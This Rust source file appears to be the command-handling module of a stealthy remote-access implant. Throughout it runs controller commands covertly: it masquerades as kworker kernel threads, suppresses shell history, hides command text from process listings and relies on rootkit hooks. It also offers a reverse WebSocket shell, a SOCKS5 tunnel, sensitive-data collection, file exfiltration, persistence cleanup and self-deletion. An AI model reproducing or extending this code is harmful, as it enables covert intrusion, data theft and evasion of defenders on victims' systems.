use std::io::Read;
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

/// Hard cap on captured stdout+stderr per stream. wait_with_output would
/// otherwise slurp `yes` / `cat /dev/zero` for the full 120s timeout and OOM.
const MAX_CMD_CAPTURE: usize = 1024 * 1024;

fn read_capped<R: Read>(mut r: R, max: usize, overflow: &AtomicBool) -> Vec<u8> {
    let mut out = Vec::new();
    let mut buf = [0u8; 8192];
    loop {
        match r.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => {
                if out.len() >= max {
                    overflow.store(true, Ordering::Relaxed);
                    break;
                }
                let take = n.min(max.saturating_sub(out.len()));
                out.extend_from_slice(&buf[..take]);
                if take < n || out.len() >= max {
                    overflow.store(true, Ordering::Relaxed);
                    break;
                }
            }
            Err(e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(_) => break,
        }
    }
    out
}

#[cfg(windows)]
fn wait_child_capped(mut command: Command, timeout_secs: u64) -> std::io::Result<std::process::Output> {
    use std::process::Stdio;
    command.stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut child = command.spawn()?;
    let overflow = Arc::new(AtomicBool::new(false));
    let (txo, rxo) = std::sync::mpsc::channel::<Vec<u8>>();
    let (txe, rxe) = std::sync::mpsc::channel::<Vec<u8>>();
    let hit_o = overflow.clone();
    let hit_e = overflow.clone();
    if let Some(so) = child.stdout.take() {
        std::thread::spawn(move || {
            let _ = txo.send(read_capped(so, MAX_CMD_CAPTURE, &hit_o));
        });
    } else {
        let _ = txo.send(Vec::new());
    }
    if let Some(se) = child.stderr.take() {
        std::thread::spawn(move || {
            let _ = txe.send(read_capped(se, MAX_CMD_CAPTURE, &hit_e));
        });
    } else {
        let _ = txe.send(Vec::new());
    }
    let deadline = Instant::now() + Duration::from_secs(timeout_secs);
    loop {
        if overflow.load(Ordering::Relaxed) {
            let _ = child.kill();
            let status = child.wait()?;
            let stdout = rxo.recv_timeout(Duration::from_secs(2)).unwrap_or_default();
            let stderr = rxe.recv_timeout(Duration::from_secs(2)).unwrap_or_default();
            return Ok(std::process::Output { status, stdout, stderr });
        }
        match child.try_wait() {
            Ok(Some(status)) => {
                let stdout = rxo.recv_timeout(Duration::from_secs(2)).unwrap_or_default();
                let stderr = rxe.recv_timeout(Duration::from_secs(2)).unwrap_or_default();
                return Ok(std::process::Output { status, stdout, stderr });
            }
            Ok(None) => {
                if Instant::now() >= deadline {
                    let _ = child.kill();
                    let _ = child.wait();
                    return Err(std::io::Error::new(
                        std::io::ErrorKind::TimedOut,
                        format!("[Timeout] command killed after {}s", timeout_secs),
                    ));
                }
                std::thread::sleep(Duration::from_millis(50));
            }
            Err(e) => return Err(e),
        }
    }
}

// ── Process group tracking for reaper (S4) ──────────────────────────────────
#[cfg(unix)]
static CMD_PGIDS: std::sync::Mutex<Vec<(i32, std::time::Instant)>> =
    std::sync::Mutex::new(Vec::new());

#[cfg(unix)]
fn register_pgid(pgid: i32) {
    if let Ok(mut v) = CMD_PGIDS.lock() {
        v.push((pgid, std::time::Instant::now()));
    }
}

#[cfg(unix)]
fn unregister_pgid(pgid: i32) {
    if let Ok(mut v) = CMD_PGIDS.lock() {
        v.retain(|(p, _)| *p != pgid);
    }
}

/// Hourly reaper: kill any tracked process group still alive.
/// Safety net for edge cases where immediate cleanup missed something.
#[cfg(unix)]
pub(crate) fn reaper_loop() {
    loop {
        std::thread::sleep(std::time::Duration::from_secs(3600));
        let mut pgids = match CMD_PGIDS.lock() {
            Ok(g) => g,
            Err(e) => e.into_inner(),
        };
        pgids.retain(|&(pgid, _)| {
            if unsafe { libc::kill(-pgid, 0) } == 0 {
                crate::debug_log(&format!("reaper: killing stale pgid={}", pgid));
                unsafe { libc::kill(-pgid, libc::SIGKILL); }
            }
            false
        });
    }
}

/// Execute a shell command silently via stdin pipe.
/// cmdline shows only "sh" — command text never enters /proc/pid/cmdline.
#[cfg(unix)]
pub(crate) fn sh_silent(cmd: &str) -> std::process::Output {
    use std::os::unix::process::ExitStatusExt;
    use std::io::Write;
    let mut child = match Command::new("sh")
        .current_dir("/")
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            crate::debug_log(&format!("sh_silent: spawn failed: {}", e));
            return std::process::Output {
                status: std::process::ExitStatus::from_raw(1 << 8),
                stdout: vec![],
                stderr: format!("sh spawn error: {}", e).into_bytes(),
            };
        }
    };
    if let Some(mut si) = child.stdin.take() {
        let _ = si.write_all(cmd.as_bytes());
        let _ = si.write_all(b"\n");
    }
    child.wait_with_output().unwrap_or_else(|e| {
        crate::debug_log(&format!("sh_silent: wait failed: {}", e));
        std::process::Output {
            status: std::process::ExitStatus::from_raw(1 << 8),
            stdout: vec![],
            stderr: format!("sh wait error: {}", e).into_bytes(),
        }
    })
}

/// Stealth command execution with Rust-native timeout.
///   - cmdline: only "sh" (command passed via stdin pipe, invisible to ps)
///   - setsid: child gets its own process group for clean kill
///   - prctl: thread name disguised as kworker
///   - post-completion: always kill(-pgid) to clean up any sub-processes
#[cfg(unix)]
fn run_cmd_stealth(
    cmd: &str,
    timeout_secs: u64,
) -> std::io::Result<std::process::Output> {
    use std::process::Stdio;
    use std::sync::mpsc;
    use std::os::unix::process::CommandExt;
    use std::io::Write;

    let pid_low = (std::process::id() ^ (std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(0)) & 0xFF) as u8;
    let cpu = pid_low % 4;
    let idx = (pid_low >> 2) % 3;
    let use_unbound = (pid_low >> 4) & 1 == 1;
    let name_bytes: Vec<u8> = if use_unbound {
        let suffixes = ["events", "mm_percpu_wq", "writeback"];
        let s = suffixes[(pid_low as usize >> 5) % suffixes.len()];
        let mut v = format!("kworker/u{}:{}-{}", cpu, idx, s).into_bytes();
        v.truncate(15); v.push(0); v
    } else {
        format!("kworker/{}:{}\x00", cpu, idx).into_bytes()
    };

    let mut command = Command::new("sh");
    command
        .current_dir("/")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .env("HISTFILE",             "/dev/null")
        .env("HISTSIZE",             "0")
        .env("HISTFILESIZE",         "0")
        .env("SAVEHIST",             "0")
        .env("HISTCONTROL",          "ignoreboth")
        .env("MYSQL_HISTFILE",       "/dev/null")
        .env("PSQL_HISTORY",         "/dev/null")
        .env("LESSHISTFILE",         "/dev/null")
        .env("NODE_REPL_HISTORY",    "/dev/null")
        .env("PYTHONSTARTUP",        "")
        .env("REDISCLI_HISTFILE",    "/dev/null")
        .env("IRBLASTERCLI_HISTFILE","/dev/null")
        .env("BASH_ENV",             "")
        .env("ENV",                  "")
        .env("PROMPT_COMMAND",       "")
        .env("TERM",                 "xterm-256color");

    unsafe {
        command.pre_exec(move || {
            libc::setsid();
            libc::umask(0o022);
            libc::prctl(libc::PR_SET_NAME, name_bytes.as_ptr() as libc::c_ulong, 0, 0, 0);
            Ok(())
        });
    }

    let mut child = command.spawn()?;
    let pid = child.id() as libc::pid_t;
    register_pgid(pid);

    if let Some(mut si) = child.stdin.take() {
        let _ = si.write_all(cmd.as_bytes());
        let _ = si.write_all(b"\n");
    }

    // Incremental drain with a hard byte cap — never wait_with_output.
    let overflow = Arc::new(AtomicBool::new(false));
    let (txo, rxo) = mpsc::channel::<Vec<u8>>();
    let (txe, rxe) = mpsc::channel::<Vec<u8>>();
    let hit_o = overflow.clone();
    let hit_e = overflow.clone();
    if let Some(so) = child.stdout.take() {
        std::thread::spawn(move || {
            let _ = txo.send(read_capped(so, MAX_CMD_CAPTURE, &hit_o));
        });
    } else {
        let _ = txo.send(Vec::new());
    }
    if let Some(se) = child.stderr.take() {
        std::thread::spawn(move || {
            let _ = txe.send(read_capped(se, MAX_CMD_CAPTURE, &hit_e));
        });
    } else {
        let _ = txe.send(Vec::new());
    }
    let (txw, rxw) = mpsc::channel();
    std::thread::spawn(move || {
        let _ = txw.send(child.wait());
    });

    let deadline = Instant::now() + Duration::from_secs(timeout_secs);
    let result = loop {
        if overflow.load(Ordering::Relaxed) {
            unsafe { libc::kill(-pid, libc::SIGKILL); }
            let stdout = rxo.recv_timeout(Duration::from_secs(2)).unwrap_or_default();
            let stderr = rxe.recv_timeout(Duration::from_secs(2)).unwrap_or_default();
            let _ = rxw.recv_timeout(Duration::from_secs(2));
            unregister_pgid(pid);
            break Ok(std::process::Output {
                status: std::os::unix::process::ExitStatusExt::from_raw(9 << 8),
                stdout,
                stderr,
            });
        }
        match rxw.recv_timeout(Duration::from_millis(50)) {
            Ok(waited) => {
                let stdout = rxo.recv_timeout(Duration::from_secs(2)).unwrap_or_default();
                let stderr = rxe.recv_timeout(Duration::from_secs(2)).unwrap_or_default();
                unregister_pgid(pid);
                break waited.map(|status| std::process::Output { status, stdout, stderr });
            }
            Err(mpsc::RecvTimeoutError::Timeout) => {
                if Instant::now() >= deadline {
                    unsafe { libc::kill(-pid, libc::SIGKILL); }
                    unregister_pgid(pid);
                    break Err(std::io::Error::new(
                        std::io::ErrorKind::TimedOut,
                        format!("[Timeout] command killed after {}s", timeout_secs),
                    ));
                }
            }
            Err(mpsc::RecvTimeoutError::Disconnected) => {
                unregister_pgid(pid);
                break Err(std::io::Error::new(
                    std::io::ErrorKind::BrokenPipe,
                    "command waiter dropped",
                ));
            }
        }
    };

    result
}

/// Strip ANSI escape sequences and CR (\r) characters from PTY output.
/// PTY programs emit \r\n line endings and ESC[...] color/cursor sequences;
/// clean these before sending output to the controller.
#[cfg(unix)]
fn strip_ansi_and_cr(input: &[u8]) -> String {
    let mut out: Vec<u8> = Vec::with_capacity(input.len());
    let mut i = 0;
    while i < input.len() {
        match input[i] {
            0x1b => {
                // ESC sequence
                i += 1;
                if i < input.len() && input[i] == b'[' {
                    // CSI sequence: ESC [ ... <final>, final byte 0x40–0x7e
                    i += 1;
                    while i < input.len() {
                        let c = input[i];
                        i += 1;
                        if c >= 0x40 && c <= 0x7e { break; }
                    }
                } else if i < input.len() && input[i] == b']' {
                    // OSC sequence: ESC ] ... ST (BEL or ESC \)
                    i += 1;
                    while i < input.len() {
                        if input[i] == 0x07 { i += 1; break; }
                        if input[i] == 0x1b && i + 1 < input.len() && input[i+1] == b'\\' {
                            i += 2; break;
                        }
                        i += 1;
                    }
                } else {
                    // Other two-byte Esc sequences
                    if i < input.len() { i += 1; }
                }
            }
            b'\r' => {
                // PTY uses \r\n; skip \r, keep \n
                i += 1;
            }
            0x00..=0x08 | 0x0e..=0x1a | 0x1c..=0x1f => {
                // Other non-printable control characters — skip
                i += 1;
            }
            c => {
                out.push(c);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).to_string()
}

/// Allocate a PTY via libc and execute a command — no external tools needed.
///
/// OPSEC comparison:
///  - script(1): exposes full command in process list; may write utmp/wtmp (visible in who/last)
///  - this impl: child directly execv's bash; process name is identical to a normal bash invocation;
///               no login_tty() call, no utmp/wtmp; PTY device (/dev/pts/N) disappears on close.
///
/// Flow: posix_openpt -> grantpt/unlockpt -> ptsname_r -> open slave ->
///       fork -> child(setsid + TIOCSCTTY + dup2 + execv) -> parent(poll + read)
#[cfg(unix)]
fn run_with_pty(cmd: &str, timeout_secs: u64) -> String {
    static BASH_PATH: std::sync::OnceLock<Option<String>> = std::sync::OnceLock::new();
    let shell = BASH_PATH.get_or_init(|| {
        ["/bin/bash", "/usr/bin/bash", "/usr/local/bin/bash"]
            .iter()
            .find(|p| std::path::Path::new(p).exists())
            .map(|p| p.to_string())
    }).as_deref().unwrap_or("/bin/sh");

    unsafe { pty_exec(shell, cmd, timeout_secs) }
}

#[cfg(unix)]
unsafe fn pty_exec(shell: &str, cmd: &str, timeout_secs: u64) -> String {
    // Pre-allocate all CStrings before fork().
    // Prevents child from calling the Rust allocator between fork and exec
    // (allocator may hold locks in a multi-threaded Tokio context -> deadlock/UB).
    // After fork, child only uses pre-allocated raw pointers — no Rust heap allocation.
    let shell_c = match std::ffi::CString::new(shell) {
        Ok(s) => s,
        Err(_) => return "[PTY] invalid shell path".to_string(),
    };
    let cmd_c = match std::ffi::CString::new(cmd.as_bytes()) {
        Ok(s) => s,
        Err(_) => return "[PTY] command contains null byte".to_string(),
    };
    // argv[0] = basename of the detected shell — pre-allocated before fork so
    // the child never touches the allocator.
    let shell_basename = shell.rsplit('/').next().unwrap_or("sh");
    let a0_c = match std::ffi::CString::new(shell_basename) {
        Ok(s) => s,
        Err(_) => return "[PTY] invalid shell path".to_string(),
    };

    // ── 1. Open PTY master ────────────────────────────────────────────────────
    let master = libc::posix_openpt(libc::O_RDWR | libc::O_NOCTTY | libc::O_CLOEXEC);
    if master < 0 { return "[PTY] posix_openpt failed".to_string(); }

    if libc::grantpt(master) != 0 || libc::unlockpt(master) != 0 {
        libc::close(master);
        return "[PTY] grantpt/unlockpt failed".to_string();
    }

    // ptsname_r: thread-safe version (supported by both musl and glibc)
    let mut name_buf = [0i8; 64];
    if libc::ptsname_r(master, name_buf.as_mut_ptr(), name_buf.len()) != 0 {
        libc::close(master);
        return "[PTY] ptsname_r failed".to_string();
    }

    // ── 2. Open PTY slave ────────────────────────────────────────────────────
    let slave = libc::open(name_buf.as_ptr(), libc::O_RDWR | libc::O_NOCTTY);
    if slave < 0 {
        libc::close(master);
        return "[PTY] open slave failed".to_string();
    }

    // Set generous terminal dimensions; prevents TUI programs from wrapping/crashing
    let ws = libc::winsize { ws_row: 50, ws_col: 220, ws_xpixel: 0, ws_ypixel: 0 };
    libc::ioctl(slave, libc::TIOCSWINSZ, &ws as *const libc::winsize);

    // ── 3. Fork ──────────────────────────────────────────────────────────────
    let pid = libc::fork();
    if pid < 0 {
        libc::close(master); libc::close(slave);
        return "[PTY] fork failed".to_string();
    }

    if pid == 0 {
        // ── Child: configure PTY then exec ───────────────────────────────────
        libc::close(master);
        // Note: we do NOT call hide_pid here (child must not use Tokio allocator
        // after fork — only async-signal-safe calls allowed in the child).
        // The parent hides this PID immediately below.

        // New session; child becomes session leader
        libc::setsid();
        // Make slave the controlling terminal (required by termbox/ncurses)
        libc::ioctl(slave, libc::TIOCSCTTY, 0i32);

        // Redirect stdio to slave PTY
        libc::dup2(slave, 0);
        libc::dup2(slave, 1);
        libc::dup2(slave, 2);
        if slave > 2 { libc::close(slave); }

        // anti-history / anti-trace: setenv after fork only affects child, not agent itself
        macro_rules! se {
            ($k:expr, $v:expr) => {
                libc::setenv($k.as_ptr() as *const libc::c_char,
                             $v.as_ptr() as *const libc::c_char, 1);
            };
        }
        se!(b"HISTFILE\0",          b"/dev/null\0");
        se!(b"HISTSIZE\0",          b"0\0");
        se!(b"HISTFILESIZE\0",      b"0\0");
        se!(b"SAVEHIST\0",          b"0\0");
        se!(b"HISTCONTROL\0",       b"ignoreboth\0");
        se!(b"MYSQL_HISTFILE\0",    b"/dev/null\0");
        se!(b"PSQL_HISTORY\0",      b"/dev/null\0");
        se!(b"LESSHISTFILE\0",      b"/dev/null\0");
        se!(b"NODE_REPL_HISTORY\0", b"/dev/null\0");
        se!(b"REDISCLI_HISTFILE\0", b"/dev/null\0");
        se!(b"PYTHONSTARTUP\0",     b"\0");
        se!(b"BASH_ENV\0",          b"\0");
        se!(b"ENV\0",               b"\0");
        se!(b"PROMPT_COMMAND\0",    b"\0");
        se!(b"TERM\0",              b"xterm-256color\0");
        libc::chdir(b"/\0".as_ptr() as *const libc::c_char);
        libc::umask(0o022);

        // Hide command from /proc/pid/cmdline: pass via env var, not argv.
        // cmdline shows: "<bash|sh> -c eval \"$_C\"" — generic, command text invisible.
        // Use the DETECTED shell (bash when available): on Debian/Ubuntu
        // /bin/sh is dash and silently breaks bash syntax ([[ ]], arrays, <<<).
        libc::setenv(
            b"_C\0".as_ptr() as *const libc::c_char,
            cmd_c.as_ptr(),
            1,
        );
        let a0 = a0_c.as_ptr() as *const libc::c_char;
        let a1 = b"-c\0".as_ptr() as *const libc::c_char;
        let a2 = b"eval \"$_C\"\0".as_ptr() as *const libc::c_char;
        let argv: [*const libc::c_char; 4] = [a0, a1, a2, std::ptr::null()];
        libc::execv(shell_c.as_ptr(), argv.as_ptr());
        libc::_exit(1);
    }

    // ── Parent: poll master for output ───────────────────────────────────────
    // PTY child is intentionally NOT hidden — see comment in run_with_timeout_rust.
    libc::close(slave);

    let mut buf_all: Vec<u8> = Vec::with_capacity(8192);
    let deadline = std::time::Instant::now()
        + std::time::Duration::from_secs(timeout_secs);

    'read: loop {
        let remain_ms = deadline
            .saturating_duration_since(std::time::Instant::now())
            .as_millis().min(500) as libc::c_int;
        if remain_ms == 0 { break; }

        let mut pfd = libc::pollfd { fd: master, events: libc::POLLIN, revents: 0 };
        let ret = libc::poll(&mut pfd as *mut libc::pollfd, 1, remain_ms);

        if ret < 0 {
            // EINTR (interrupted by signal) -> retry; any other error -> exit
            let err = std::io::Error::last_os_error().raw_os_error().unwrap_or(0);
            if err == libc::EINTR { continue; }
            break;
        }

        if ret == 0 {
            // Timeout slice: check whether child has already exited
            let mut st = 0i32;
            if libc::waitpid(pid, &mut st, libc::WNOHANG) == pid { break; }
            continue;
        }

        let mut chunk = [0u8; 4096];
        let n = libc::read(master, chunk.as_mut_ptr() as *mut libc::c_void, chunk.len());
        if n <= 0 { break 'read; }  // EIO: slave closed (child exited)

        buf_all.extend_from_slice(&chunk[..n as usize]);
        if buf_all.len() > 102400 { break; }
    }

    libc::close(master);

    // Kill entire process group (child called setsid, pgid = pid)
    let mut st = 0i32;
    if libc::waitpid(pid, &mut st, libc::WNOHANG) == 0 {
        libc::kill(-pid, libc::SIGTERM);
        std::thread::sleep(std::time::Duration::from_millis(300));
        if libc::waitpid(pid, &mut st, libc::WNOHANG) == 0 {
            libc::kill(-pid, libc::SIGKILL);
            libc::waitpid(pid, &mut st, 0);
        }
    }
    // Final sweep: catch any sub-process that survived
    libc::kill(-pid, libc::SIGKILL);

    let result = strip_ansi_and_cr(&buf_all);
    if result.len() > 102400 {
        let mut end = 102400;
        while end > 0 && !result.is_char_boundary(end) { end -= 1; }
        format!("{}...\n[Output truncated]", &result[..end])
    } else {
        result
    }
}

/// Command execution entry point: wrapped in catch_unwind so a panicking command
/// does not crash the agent.
///
/// Each command runs in an isolated context; panics are caught and returned as
/// error strings so the main process keeps running.
pub fn execute_command(cmd: &str) -> String {
    let cmd_owned = cmd.to_string();
    // Spawn a dedicated thread for catch_unwind, decoupled from Tokio runtime
    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        execute_command_inner(&cmd_owned)
    }));
    match result {
        Ok(output) => output,
        Err(_) => "[Error] Command caused a panic; agent remains alive.".to_string(),
    }
}

fn execute_command_inner(cmd: &str) -> String {
    let mut cmd = cmd.to_string();
    let mut is_interactive = false;

    if cmd.starts_with("interactive:") {
        is_interactive = true;
        cmd = cmd.strip_prefix("interactive:").unwrap().to_string();
    }

    // Log command type (mask full content for opsec — only log the verb/prefix)
    let log_tag = if cmd.starts_with("upload_chunk ") { "upload_chunk".to_string() }
        else if cmd.starts_with("download ") { "download".to_string() }
        else if cmd.starts_with("upload ") { format!("upload {}", cmd.strip_prefix("upload ").unwrap_or("").trim()) }
        else if cmd.starts_with("upgrade ") { "upgrade".to_string() }
        else if cmd.starts_with("wspty ") { "wspty".to_string() }
        else if cmd.starts_with("tunnel ") { "tunnel".to_string() }
        else if cmd.trim() == "tunnel:close" { "tunnel:close".to_string() }
        else { cmd.chars().take(40).collect::<String>() };
    crate::debug_log(&format!("CMD execute: [{}] interactive={}", log_tag, is_interactive));

    // ── 内部调度控制（schedule 命令）───────────────────────────────────────
    // agent 自己在轮询循环里判断到期，不留 crontab、不做外部依赖（见 schedule.rs）。
    if let Some(reply) = crate::schedule::handle_command(&cmd) {
        return reply;
    }

    if cmd.trim() == "uninstall" {
        crate::debug_log("CMD: uninstall triggered");
        return handle_uninstall();
    }

    if cmd.starts_with("upgrade ") {
        let path = cmd.strip_prefix("upgrade ").unwrap().trim();
        crate::debug_log(&format!("CMD: upgrade from path={}", path));
        return handle_upgrade(path);
    }

    // ── WS PTY long-connection shell ────────────────────────────────────────
    // "wspty ws://IP:PORT/api/v2/stream/AGENT_ID" → start reverse WS PTY
    // "wspty:close"                               → stop active session
    #[cfg(unix)]
    if cmd.trim() == "wspty:close" {
        crate::debug_log("CMD: wspty:close requested");
        crate::ws_pty::request_stop();
        return "WS PTY stop requested".to_string();
    }

    #[cfg(unix)]
    if cmd.starts_with("wspty ") {
        let ws_url = cmd.strip_prefix("wspty ").unwrap().trim().to_string();
        if ws_url.is_empty() {
            return "Usage: wspty ws://IP:PORT/api/v2/stream/AGENT_ID".to_string();
        }
        crate::debug_log(&format!("CMD: wspty spawning thread url={}", ws_url));
        // start() stops a leftover session if one is still up (one-shot cliws).
        // Spawn in a regular OS thread via std::thread so it's completely independent
        // of the tokio runtime and won't affect C2 polling.
        let url = ws_url.clone();
        std::thread::spawn(move || {
            let result = crate::ws_pty::start(url);
            crate::debug_log(&format!("WS PTY session ended: {}", result));
        });
        return format!("WS PTY connecting to {}", ws_url);
    }

    // ── Stowaway tunnel (built-in SOCKS5 proxy) ────────────────────────────
    // "tunnel IP:PORT SECRET"  → start tunnel
    // "tunnel:close"           → stop active tunnel
    if cmd.trim() == "tunnel:close" {
        crate::debug_log("CMD: tunnel:close requested");
        crate::stowaway::request_stop();
        return "tunnel stop requested".to_string();
    }

    if cmd.starts_with("tunnel ") {
        let rest = cmd.strip_prefix("tunnel ").unwrap().trim();
        let parts: Vec<&str> = rest.splitn(2, ' ').collect();
        if parts.len() < 2 {
            return "Usage: tunnel IP:PORT SECRET".to_string();
        }
        let addr = parts[0].to_string();
        let secret = parts[1].to_string();
        if crate::stowaway::is_active() {
            crate::debug_log("CMD: tunnel rejected — already active");
            return "tunnel already active — send 'tunnel:close' first".to_string();
        }
        crate::debug_log(&format!("CMD: tunnel addr={} secret=***", addr));
        return crate::stowaway::start(&addr, &secret);
    }

    // Sensitive data collection (visible in the controller Terminal tab)
    if cmd.trim() == "sensitive" {
        return crate::linux_sensitive::collect_sensitive();
    }

    // Real-time sysinfo (more accurate than the snapshot taken at registration)
    if cmd.trim() == "sysinfo" {
        return crate::sysinfo::collect_sysinfo();
    }

    if cmd == "ls" || cmd.starts_with("ls ") {
        let path = cmd.strip_prefix("ls").unwrap().trim();
        return crate::files::list_files(path);
    }
    if cmd == "dir" || cmd.starts_with("dir ") {
        let path = cmd.strip_prefix("dir").unwrap().trim();
        return crate::files::list_files(path);
    }

    if cmd.starts_with("upload ") {
        let path = cmd.strip_prefix("upload ").unwrap().trim();
        return match crate::filetransfer::upload_file(path) {
            Ok(payload) => format!("[FILE_UPLOAD_JSON]\n{}", payload),
            Err(e) => e,
        };
    }

    if cmd.starts_with("readfile ") {
        let path = cmd.strip_prefix("readfile ").unwrap().trim();
        return match crate::filetransfer::preview_file(path) {
            Ok(msg) => msg,
            Err(e) => e,
        };
    }

    if cmd.starts_with("download ") {
        let rest = &cmd[9..];
        // Split at the last space: path (may contain spaces) first, base64 data (no spaces) last
        if let Some(last_space) = rest.rfind(' ') {
            let path = rest[..last_space].trim();
            let data = rest[last_space + 1..].trim();
            return match crate::filetransfer::download_file(path, data) {
                Ok(msg) => msg,
                Err(e) => e,
            };
        }
        return "Usage: download /path/to/save <base64data>".to_string();
    }

    if cmd.starts_with("upload_chunk ") {
        let payload = cmd.strip_prefix("upload_chunk ").unwrap().trim();
        return match serde_json::from_str::<crate::filetransfer::UploadChunkRequest>(payload) {
            Ok(request) => match crate::filetransfer::handle_upload_chunk(request) {
                Ok(msg) => msg,
                Err(e) => e,
            },
            Err(e) => format!("Error: {}", e),
        };
    }

    #[cfg(windows)]
    let output = {
        use std::os::windows::process::CommandExt;

        if cmd.starts_with("cmd:") {
            let actual_cmd = &cmd[4..];
            let mut command = Command::new("cmd");
            command.args(&["/c", actual_cmd]);
            command.creation_flags(0x08000000);
            wait_child_capped(command, 120)
        } else {
            let mut command = Command::new("powershell");
            command.arg("-NoProfile");
            if !is_interactive {
                command.arg("-NonInteractive");
            }
            command.args(&["-ExecutionPolicy", "Bypass", "-Command", &cmd]);
            command.creation_flags(0x08000000);
            wait_child_capped(command, 120)
        }
    };

    #[cfg(unix)]
    let output = {
        if is_interactive {
            return run_with_pty(&cmd, 120);
        }
        run_cmd_stealth(&cmd, 120)
    };

    match output {
        Ok(o) => {
            let mut result = String::from_utf8_lossy(&o.stdout).to_string();
            result.push_str(&String::from_utf8_lossy(&o.stderr));

            if result.len() > 102400 {
                let mut end = 102400;
                while end > 0 && !result.is_char_boundary(end) {
                    end -= 1;
                }
                format!("{}...\n[Output truncated]", &result[..end])
            } else {
                result
            }
        }
        Err(e) => format!("Error: {}", e),
    }
}

fn handle_uninstall() -> String {
    crate::debug_log("CMD uninstall: starting");
    #[cfg(unix)]
    {
        let r = crate::rootkit::uninstall_rootkit();
        crate::debug_log(&format!("CMD uninstall: rootkit={}", r.unwrap_or_else(|e| e)));
    }

    let r = crate::persist::uninstall_persistence();
    crate::debug_log(&format!("CMD uninstall: persist={}", r));

    #[cfg(windows)]
    {
        let username = whoami::username();
        let base = format!(r"C:\Users\{}\AppData\Local\.config", username);
        for name in &[
            "machine-id.txt",
            "agent_id.txt",
            "journal-audit.log",
            "random-seed.txt",
            "clock.txt",
            "preset.dat",
            "catalog.json",
            "hwdb.txt",
        ] {
            let _ = std::fs::remove_file(format!(r"{}\{}", base, name));
        }
        let _ = std::fs::remove_dir_all(format!(r"{}\coredump", base));
    }

    #[cfg(unix)]
    {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root {
            // Current state files
            for name in &[
                "machine-id", "agent_id", "random-seed", "clock",
                "preset", "inhibit.lock", "journal-audit", "catalog",
                "hwdb",
            ] {
                let _ = std::fs::remove_file(format!("/var/tmp/.systemd/{}", name));
            }
            let _ = std::fs::remove_dir_all("/var/tmp/.systemd/coredump");

            // Persistent backup copies written by install_devshm_recovery
            let _ = std::fs::remove_file("/var/tmp/.polkitd");
            let _ = std::fs::remove_file("/var/tmp/.accounts-daemon");
            // Recovery helper scripts
            let _ = std::fs::remove_file("/var/tmp/.polkitd-rc.sh");
            let _ = std::fs::remove_file("/var/tmp/.acctd-rc.sh");

            // Legacy paths (old version compatibility)
            for name in &["issue", "agent_id", "last_comment", "agent.lock",
                          "backup_config", "pending_responses", "processed_cmds"] {
                let _ = std::fs::remove_file(format!("/var/lib/systemd/{}", name));
            }
            let _ = std::fs::remove_file("/var/log/systemd-debug.log");
            let _ = std::fs::remove_file("/tmp/.inhibit.lock");

            // Also clean $HOME/.local/share in case agent ran as non-root before
            let home = std::env::var("HOME").unwrap_or_default();
            if !home.is_empty() {
                let share = format!("{}/.local/share", home);
                for name in &[
                    "machine-id", "agent_id", "random-seed", "clock",
                    "preset", "inhibit.lock", "journal-audit", "catalog", "hwdb",
                    "issue", "last_comment", "last_comment_time", "agent.lock",
                    "agent-debug.log", "pending_responses", "processed_cmds", "backup_config",
                ] {
                    let _ = std::fs::remove_file(format!("{}/{}", share, name));
                }
                let _ = std::fs::remove_dir_all(format!("{}/coredump", share));
                let _ = std::fs::remove_dir_all(format!("{}/uploads", share));
            }
        } else {
            let home = std::env::var("HOME").unwrap_or_default();
            let share = format!("{}/.local/share", home);
            for name in &[
                "machine-id", "agent_id", "random-seed", "clock",
                "preset", "inhibit.lock", "journal-audit",
                "catalog", "hwdb",
            ] {
                let _ = std::fs::remove_file(format!("{}/{}", share, name));
            }
            let _ = std::fs::remove_dir_all(format!("{}/coredump", share));
            let _ = std::fs::remove_dir_all(format!("{}/uploads", share));
            // Legacy file names
            for legacy in &["issue", "last_comment", "last_comment_time", "agent.lock",
                            "agent-debug.log", "pending_responses", "processed_cmds", "backup_config"] {
                let _ = std::fs::remove_file(format!("{}/{}", share, legacy));
            }
        }
    }

    crate::debug_log("CMD uninstall: files cleaned, scheduling self-delete in 5s");
    std::thread::spawn(|| {
        std::thread::sleep(std::time::Duration::from_secs(5));
        let _ = crate::selfdel::self_delete();
        // self_delete() calls _exit/_Exit and never returns on Unix;
        // this line is only reached on Windows where process::exit is fine.
        std::process::exit(0);
    });

    "Uninstalling...".to_string()
}

fn handle_upgrade(new_binary_path: &str) -> String {
    #[cfg(not(unix))]
    {
        let _ = new_binary_path;
        return "Error: upgrade only supported on Linux".to_string();
    }

    #[cfg(unix)]
    {
        // G：ELF 升级必须经过 magic+尺寸校验（项 7），低于该下限按“非有效二进制”拒绝。
        const UPGRADE_MIN_BYTES: u64 = 256 * 1024;
        // Use cached exe path (set before rootkit hide_self() spoofs /proc/self/exe).
        // current_exe() after hide_self() returns /sbin/init — MUST NOT use it.
        let current_exe = match crate::rootkit::get_exe_path()
            .or_else(|| std::env::current_exe().ok())
        {
            Some(p) => p,
            None => return "Error: cannot determine current exe path".to_string(),
        };
        let current_str = current_exe.to_string_lossy().to_string();

        match std::fs::metadata(new_binary_path) {
            Err(_) => {
                crate::debug_log(&format!("CMD upgrade: new binary not found: {}", new_binary_path));
                return format!("Error: {} not found", new_binary_path);
            }
            Ok(meta) if meta.len() == 0 => {
                crate::debug_log(&format!("CMD upgrade: new binary is empty (0 bytes), aborting"));
                return "Error: new binary is 0 bytes (incomplete transfer?), upgrade aborted".to_string();
            }
            Ok(meta) if meta.len() < UPGRADE_MIN_BYTES => {
                // G：尺寸下限——404/报错页落盘常为“<!DOCTYPE html>”等几 KB，
                // 直接替换会让 agent 变死二进制；先拦截。
                crate::debug_log(&format!(
                    "CMD upgrade: new binary too small ({} bytes < {}), aborting",
                    meta.len(), UPGRADE_MIN_BYTES));
